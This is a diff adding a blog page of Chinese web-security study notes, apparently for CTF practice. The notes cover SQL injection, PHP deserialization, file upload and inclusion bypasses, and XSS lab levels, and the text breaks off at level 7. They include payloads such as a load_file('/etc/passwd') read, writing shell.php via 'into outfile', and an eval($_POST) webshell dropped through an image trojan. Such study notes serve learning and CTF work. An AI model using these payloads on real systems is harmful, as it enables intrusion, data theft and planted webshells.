@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SQL注入sql注入的成因：1.传入服务器的参数未经过滤或过滤不完全2.数据库安全配置不完善(以字符型做演示) 1.联合注入  判断注入点:[?id&#x3D;1’ and 1&#x3D;1 #]&#x2F;[?id&#x3D;1’ and 1&#x3D;2 #]根据页面回显判断是否存在sql注入  猜解字段:用[order by]&#x2F;[group by]&#x2F;[union select…]来猜解  观察信息在哪里回显[?id&#x3D;-1 union sel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2020/10/01/D0g3-%E4%BA%8C%E6%AC%A1%E6%8B%9B%E6%96%B0-%E8%B5%B5%E5%A8%81-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL注入sql注入的成因：1.传入服务器的参数未经过滤或过滤不完全2.数据库安全配置不完善(以字符型做演示) 1.联合注入  判断注入点:[?id&#x3D;1’ and 1&#x3D;1 #]&#x2F;[?id&#x3D;1’ and 1&#x3D;2 #]根据页面回显判断是否存在sql注入  猜解字段:用[order by]&#x2F;[group by]&#x2F;[union select…]来猜解  观察信息在哪里回显[?id&#x3D;-1 union sel">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200309231933-6157fd8c-6219-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200309232143-aed4f4d4-6219-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200309232159-b86d205c-6219-1.png">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1gisciw74acj30ss04mwf5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1gisclefu3rj30sn08jq3l.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1giscmuepolj30bv03ljrb.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200309232244-d2fe84c4-6219-1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200705143509960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1gidj7p2a9zj30o60hgacc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1gidjlkhlhqj30ql0o2dgr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNly1gislt78temj30s50n5n1n.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNly1gisndksa4rj30bt0a6aai.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNly1gisnegwj3pj30jx0e6gmw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNly1gisnhpvq54j310w0gkta6.jpg">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190628083012556.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190628083024735.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190628083037516.png">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1gisu25dt5dj31020mlq7b.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1gisu4s2laej30ia08qglp.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1gisu9f8sq7j30ef07iq5f.jpg">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190921205426535.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190921210331855.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190921210639856.png">
+<meta property="og:image" content="c:/Users/hello/AppData/Roaming/Typora/typora-user-images/1600321611196.png">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007YMQQNgy1gitlqslkzyj30xe0aodge.jpg">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1674381/201905/1674381-20190517085800360-2098493848.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019092122010135.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190921220424920.png">
+<meta property="article:published_time" content="2020-10-01T10:32:48.539Z">
+<meta property="article:modified_time" content="2020-09-17T14:24:50.631Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200309231933-6157fd8c-6219-1.png">
+
+<link rel="canonical" href="http://example.com/2020/10/01/D0g3-%E4%BA%8C%E6%AC%A1%E6%8B%9B%E6%96%B0-%E8%B5%B5%E5%A8%81-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title> | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/01/D0g3-%E4%BA%8C%E6%AC%A1%E6%8B%9B%E6%96%B0-%E8%B5%B5%E5%A8%81-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-10-01 18:32:48" itemprop="dateCreated datePublished" datetime="2020-10-01T18:32:48+08:00">2020-10-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-17 22:24:50" itemprop="dateModified" datetime="2020-09-17T22:24:50+08:00">2020-09-17</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>sql注入的成因：1.传入服务器的参数未经过滤或过滤不完全2.数据库安全配置不完善(以字符型做演示)</p>
+<p>1.联合注入</p>
+<ul>
+<li><p>判断注入点:[?id=1’ and 1=1 #]/[?id=1’ and 1=2 #]根据页面回显判断是否存在sql注入</p>
+</li>
+<li><p>猜解字段:用[order by]/[group by]/[union select…]来猜解</p>
+</li>
+<li><p>观察信息在哪里回显[?id=-1 union select 1,2,3,4….#]</p>
+</li>
+<li><p>获取数据库敏感信息[union select database()]  user()   version()</p>
+</li>
+<li><p>获取表名，字段名，字段值</p>
+<p>[union select group_concat(table_name) from information_schema.tables where table_schema=database() #]</p>
+<p>[union select group_concat(colun_name) from  information_schema.columns where table_name=’xx’ #]</p>
+<p>[union select group_concat(xx) from xxx]</p>
+</li>
+</ul>
+<ol start="2">
+<li><p>报错注入</p>
+<p>Xpath语法错误：extractvalue(),updatexml(),这两个函数第二个参数必须是符合Xpath语法的字符串，不符合要求则会报错</p>
+<p>[‘and updatexml(1,concat(0x2c,(sleect[xxx]),0x2c),1)#]</p>
+<p>[‘and extractvalue(1,concat(0x2c,(select xxx),0x2c))#]</p>
+</li>
+</ol>
+<p>   重复键冲突</p>
+<p>   [‘ and (select 1 from (select count(*),concat(‘xxx’,’~’,floor(rand()*2))x from information_schema.tables group by x)a) # ]</p>
+<ol start="3">
+<li><p>宽字节注入 </p>
+<p>有时，单引号前会加入一个转义字符，如果服务端使用addslashes()函数对关键字符进行转义(我记得dvwa中就这样),同时数据库使用了GBK编码，就可以使用宽字节注入</p>
+<ul>
+<li>[?id=1%df’]在单引号前加%df   由于单引号前加一个转义字符\，就变成了[?id=1%df\‘] 而%df\是一个汉字，所以再结合常规注入就可以了</li>
+</ul>
+</li>
+<li><p>二次注入</p>
+<p> 就是，在存的时候经过了转义处理，到了数据库后被还原了，再次取出来的时候没有经过处理，从而造成了二次注入</p>
+<ul>
+<li>[INSERT INTO user (‘id’,’name’)VALUES(1,’Alice’ and 1=1 #’)]</li>
+<li>处理后[INSERT INTO user (‘id’,’name’)VALUES(1,’Alice\‘ and 1=1 #’)]</li>
+<li>存到数据库里被还原，取出时未作处理</li>
+<li>[SELECT id from user WHERE name =’Alice’ and 1=1#’’]引发注入</li>
+</ul>
+</li>
+<li><p>堆叠注入</p>
+<p>这种情况，是过滤一些关键词如select时，</p>
+<ul>
+<li><p>[1’;show databases] 查看数据库</p>
+<p>[1’;show tables] 查看表名</p>
+<p>[1’;show columns from `table_name’]</p>
+<p>[1’;insert into]</p>
+</li>
+<li><p>handler语句(一行一行的浏览)简单举例，做题遇到过</p>
+<p>HANDLER tb_name OPEN ;</p>
+<p>HANDLER tb_name READ FIRST/NEXT/LAST; </p>
+<p>HANDLER tbl_name CLOSE;</p>
+</li>
+</ul>
+</li>
+<li><p>无列名注入</p>
+<p>select 1,2,3 union select 三列 from 表</p>
+<p>上面会暂时形成一张新的表，列名名就变成了1，2，3所以不知道列名也能得到敏感信息</p>
+<p>(有时information_schema被禁掉了，可以用sys.schema_auto_increment_columns来代替)</p>
+</li>
+<li><p>sql注入读写文件</p>
+<p>读文件：load_file()</p>
+<p>[1’ and 1=0 union select 1,2,load_file(‘/etc/passwd’)  #]</p>
+<p>写文件：into_outfile</p>
+<p>[1’ and 1=0 union select xxx into outfile ‘/var/www/html/shell.php’ #]</p>
+</li>
+</ol>
+<h2 id="反序列化相关"><a href="#反序列化相关" class="headerlink" title="反序列化相关"></a>反序列化相关</h2><ol>
+<li><p>简单介绍</p>
+<p>定义：把一个结构抽象的东西转变为易于传输的字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;s:1:&quot;b&quot;;s:3:&quot;efg&quot;;&#125;       </span><br></pre></td></tr></table></figure>
+
+<p>上述意思为</p>
+<p>对象：对象名长度为4：对象名为test：里面有两个属性：名字为a的字符串：其内容为abc长度为3；另一个名为b，名长度为1，内容为efg，内容长度为3</p>
+<p>常见的魔术方法</p>
+<ul>
+<li>__construct(),类的构造函数</li>
+<li>__destruct()，类的析构函数</li>
+<li>__call()，在对象中调用一个不可访问方法时调用</li>
+<li>__ get()，获得一个类的成员变量时调用</li>
+<li>__set()，设置一个类的成员变量时调用</li>
+<li>__sleep()，执行serialize()时，先会调用则个函数</li>
+<li>__wakeup()，执行unserialize(),先会调用这个函数</li>
+<li>__toString()，类被当成字符串时的回应方法 如：echo $a</li>
+<li>__invoke(),调用函数的方式调用一个对象时的回应方法</li>
+</ul>
+</li>
+<li><p>__wakeup绕过</p>
+<p>序列化字符串中表示对象属性个数的之大于真实的属性个数时会跳过__wakeup的执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;pwd&quot;;&#125;&#39;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>session反序列化</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200309231933-6157fd8c-6219-1.png"></p>
+<p>session有三种处理器，当写入和读取所使用的处理器不同时，便会产生漏洞，其中第二个不常用(至少我做题没有遇见过)</p>
+<p>最常见的利用形式是写入时使用的处理器是php_serialize,读取时使用的处理器是php</p>
+<p>通常在本地搭建环境，把写好的对象序列化，之后在序列化后的字符串前加一个|这样的符号</p>
+<p><strong>不过有时候代码中不存在对$_SESSION赋值的情况</strong></p>
+<p>在php中还存在一个uplload_process机制，即自动在$_SESSION中创建一个键值对，值中刚好存在用户可控的部分</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200309232143-aed4f4d4-6219-1.png"></p>
+<p>以一道ctf举例(<strong>Jarvis OJ——PHPINFO</strong>)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200309232159-b86d205c-6219-1.png"></p>
+<p>写一个表单<img src="http://ww1.sinaimg.cn/large/007YMQQNgy1gisciw74acj30ss04mwf5.jpg" alt="sublime_text_hWRJ6g0VbW.png"></p>
+<p>构建payload<img src="http://ww1.sinaimg.cn/large/007YMQQNgy1gisclefu3rj30sn08jq3l.jpg" alt="sublime_text_qQH7pcLrqv.png"></p>
+<p>在本地提交，用bp抓包</p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNgy1giscmuepolj30bv03ljrb.jpg" alt="SpeedBall_hhGTscAUjB.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200309232244-d2fe84c4-6219-1.png"></p>
+<p>这最后一张图是我从网上找的，其它的都是自己弄得，这最后一个步骤，不知道为什么就是不成功，不知道哪里出了问题，明明操作都是一样的，上网查也没查出个所以然来。</p>
+<p><strong>补充</strong></p>
+<p>scandir():以数组的形式返回目录中的文件和目录</p>
+<p>dirname():返回路径中的目录部分</p>
+<p>__FILE__:  _FILE__表示当前所在文件的绝对路径包括文件名</p>
+</li>
+<li><p>反序列化逃逸</p>
+<p>简单的来说：就是php序列化后的字符串经过了替换，导致字符串长度发生了变化，我感觉不难但是有点绕，脑子不清醒的时候容易把自己绕晕，做题的时候可以本地搭建环境，凑出答案</p>
+<p>经典题目：[0CTF 2016]piapiapia(替换变长)</p>
+<p>​                    [安询杯 2019]easy_serialize_php(替换变短)(作为举例)</p>
+<p>这是源码</p>
+<p><img src="https://img-blog.csdnimg.cn/20200705143509960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70"></p>
+<p>这是我本地测试的小代码</p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNgy1gidj7p2a9zj30o60hgacc.jpg"></p>
+<p><strong>键逃逸和值逃逸</strong></p>
+<p>值逃逸(这需要两个连续的键值对，由第一个的值覆盖第二个的键这样第二个值就逃逸出去，单独作为一个键值对)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure>
+
+<p>var_dump的结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;a:3&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>键逃逸：(这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对)</p>
+<p>我喜欢这个，以为写的东西少,下图是我解出flag的截图</p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNgy1gidjlkhlhqj30ql0o2dgr.jpg"></p>
+</li>
+<li><p>phar拓展反序列化</p>
+<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data的内容</p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNly1gislt78temj30s50n5n1n.jpg" alt="chrome_ywn9KVPmBH.png"></p>
+<p><strong>注意</strong></p>
+<p>要将php.ini中的phar.readonly选项设置为off，否则无法生成phar文件(<strong>而且一定要去掉phar.readonly前面的；，去掉；很重要，但网上大部分文章都没有写，我之前本地做实验废了好长时间才发现还要去掉前面的；额，再重启一下</strong>)</p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNly1gisndksa4rj30bt0a6aai.jpg" alt="sublime_text_bKTiIKDWFH.png"><img src="http://ww1.sinaimg.cn/large/007YMQQNly1gisnegwj3pj30jx0e6gmw.jpg" alt="sublime_text_se59oNbnAR.png"></p>
+<p>在本地搭环境后访问第二个图所表示的页面，文件夹下就会生成一个phar.phar的文件。把phar.phar用winhex打开，可以看到一串序列化后的字符串，(那就是我们的payload)之后再在第一个图中代码所表示的页面使用phar伪协议，就ok了</p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNly1gisnhpvq54j310w0gkta6.jpg" alt="chrome_sH1KckMiQv.png"></p>
+<p>还有<strong>在setstub中加上GIF89a可以伪装成图片</strong></p>
+</li>
+</ol>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>前端限制</strong>：通过burp修改后缀(我喜欢这样)，也可以直接删除js(我不喜欢，也不会)</p>
+<p><strong>服务端检测</strong>：</p>
+<p>​    过滤不严谨的话：大小写绕过，php2345(php后加数字绕过)，双写绕过，phtml。。。。</p>
+<p>​    文件头检测：如exif_imagetype()     有什么image/gif 等等</p>
+<p>​    文件内容检测：如getimagesize()      可以在文件中前面添加GIF89a,因为16进制编码后正好与gif文件的文件头相重合。</p>
+<p>​    文件系统00阶段： tips：使用burp，没使用hex之前添加个空格(hex打开后为20)(空格的作用是方便定位)，使用hex后把20改成00(有点像c语言)</p>
+<p><strong>.htaccess文件</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “1.jpg”&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">AddType application&#x2F;x-http-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>​    可以把jpg文件当作php文件解析</p>
+<p><strong>系统特性</strong>：</p>
+<p>​    windows下：上传1.php. 文件后缀名中的.会被自动去掉</p>
+<p><strong>解析漏洞</strong>：</p>
+<p>​    apache(2.0-2.2)：xxx.php.aa.bb，对于这样的文件，apache会从右往左解析文件的后缀名，碰到不认识的就会跳过。</p>
+<p>​    apache(2.4.0-2.4.29)：为了解决老版解析问题，新版本中加入了&lt;FilesMatch .php$&gt;这样的设置，将以.php为后缀名的文件当做php文件来解析。但是正则没有进行多行匹配，也就是说，可以通过换行污染来让apache把恶意文件成功解析为php文件。       xxx.php%0a(使用hex添加)</p>
+<p>​    IIS6.0：如果目录名包含”.asp”字符串，那么这个目录下所有文件都会按照asp去解析。另一种就是只要文件名中含有”.asp;jpg”，服务器默认不解析;号后面的内容</p>
+<p>​    IIS7.0/7.5：在URL后追加”/xxx.php”，就会按照php的方式去解析   http:/xxx.com/123.jpg/xxx.php</p>
+<p>​    Nginx：在文件名后面添加/xxx.php       123.jpg/xxx.php</p>
+<p><strong>条件竞争</strong>：</p>
+<p>​    利用服务端的处理逻辑来得到webshell：文件可以直接上传，上传成功后进行判断，如果文件符合要求，则重命名，如果不符合要求，则删除文件。如果用户A上传了不合法的木马文件，由于代码执行需要时间，此时B用户访问了A上传的文件，如果文件还未来得及删除，就能访问到该木马文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $file&#x3D;fopen(“shell.php”,”w”); fputs($f,’&lt;?php phpinfo();?&gt;’) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    用burp的intruder模块不断发送1.php文件，同时另外再开一个intruder模块不断访问上传的文件，如果在一次请求中访问成功的话，那么webshell就写入到服务器了</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>成因：文件包含的函数参数没有经过严格的过滤且可以被用户控制</p>
+<p>主要函数：include(), include_once(),require(),require_once()</p>
+<p>文件包含不在乎包含的文件到底是什么格式，只要其中包含有php代码块，就会将其解析</p>
+<p><strong>php伪协议</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter：?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br><span class="line">php:&#x2F;&#x2F;input：?file&#x3D;php:&#x2F;&#x2F;input      POST传入php代码，可以执行任意代码</span><br><span class="line">file:&#x2F;&#x2F;：?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd       访问本地文件</span><br><span class="line">zip:&#x2F;&#x2F;：?file&#x3D;zip:&#x2F;&#x2F;[压缩文件路径]%23[压缩文件的子文件名]   可以访问压缩文件中的文件</span><br><span class="line">phar:&#x2F;&#x2F;：?file&#x3D;phar:&#x2F;&#x2F;[压缩文件路径]&#x2F;[压缩文件的子文件名]</span><br></pre></td></tr></table></figure>
+
+<p><strong>结合文件上传</strong></p>
+<p>1.编辑一个图片马，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[123]);?&gt;&#39;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.在能进行文件包含的页面，包含上述图片马(可能会使用到几个../来跳转目录)</p>
+<p>3.生成webshell后，使用蚁剑或菜刀连接即可</p>
+<p><strong>包含Apache日志文件</strong></p>
+<p>有时，网站存在文件包含漏洞，但却没有文件上传点，可以试试利用Apache的日志文件来生成一句话木马，用户发起请求时，服务器会将请求写入access.log,当发生错误时，将错误写入error.log</p>
+<p><img src="https://img-blog.csdnimg.cn/20190628083012556.png"></p>
+<p>正常访问时，</p>
+<p><img src="https://img-blog.csdnimg.cn/20190628083024735.png"></p>
+<p>访问一个不存在的资源时，</p>
+<p><img src="https://img-blog.csdnimg.cn/20190628083037516.png"></p>
+<p>不过通过上述图片可以看到，错误日志中php代码被进行了编码，我们可以使用bp抓包，将报文改回去，再次进行发送。</p>
+<p>再通过文件包含漏洞访问，即可执行</p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>由于本人太菜，没遇到什么xss的题，所以简单记录以下自己靶场的通关过程(解法不唯一，本人只是记录以下我的学习过程)</p>
+<p>在线靶场网址：(<a target="_blank" rel="noopener" href="http://xssaq.com/yx/level1.php?name=test">http://xssaq.com/yx/level1.php?name=test</a>)</p>
+<p><strong>第一关：</strong></p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNgy1gisu25dt5dj31020mlq7b.jpg" alt="chrome_FPJfTqUh8T.png"></p>
+<p>在输入点改一下后，查看源代码</p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNgy1gisu4s2laej30ia08qglp.jpg" alt="sXquE5LMRv.png"></p>
+<p>可以看到，由于是第一关，所以任何的防护措施都没有，</p>
+<p>直接<script>alert()</script>即可过关</p>
+<p>(以后的关卡我写的简略一点，基本操作都是一样的，不一样的我会写出来的)</p>
+<p><strong>第二关</strong></p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNgy1gisu9f8sq7j30ef07iq5f.jpg" alt="chrome_IV7C1mknTQ.png"></p>
+<p>第二关输出点在属性里面，要闭合”&gt;    输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(0)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>即可通关</p>
+<p><strong>第三关</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20190921205426535.png"></p>
+<p>可见，属性里面的&lt;&gt;被过滤掉了，可以采用事件，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&#39;alert(0)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第四关</strong></p>
+<p>方法同第三关</p>
+<p><strong>第五关</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20190921210331855.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190921210639856.png"></p>
+<p>此次，在script中加了一道下划线，事件也被加了一道下划线，大小写没法绕过，但JavaScript并没有过滤，可与别的标签组合,payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascript:alert()&gt;whatever&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>题外话;我觉得href=javascript:alert() 与伪协议有些神似</p>
+<p><strong>第六关</strong></p>
+<p>这一关与上一关相比，把href中也加了一道下划线，不过本关调整以下大小写，即可通关</p>
+<p><strong>第七关</strong></p>
+<p>这一关把一些关键词直接替换为空了，如 on script</p>
+<p>所以复写即可通关，payload为</p>
